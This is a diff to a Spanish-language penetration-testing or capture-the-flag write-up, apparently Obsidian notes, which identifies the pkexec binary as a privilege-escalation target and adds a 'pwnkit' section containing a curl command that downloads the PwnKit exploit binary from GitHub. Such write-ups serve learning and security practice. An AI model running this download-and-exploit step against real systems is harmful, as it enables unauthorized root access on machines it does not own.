@@ -298,3 +298,9 @@ with open("/var/log/apache2/access.log") as file:
 buscando binarios hemos conseguido el binario `pkexec` con la experiencia que ya tenemos sabemos muy bien que este binario es potencialmente vulnerable así que vamos a intentar explotarlo para escalar privilegios
 ![[Pasted image 20240713184937.png]]
 
+### pwnkit
+
+```python
+curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
+```
+
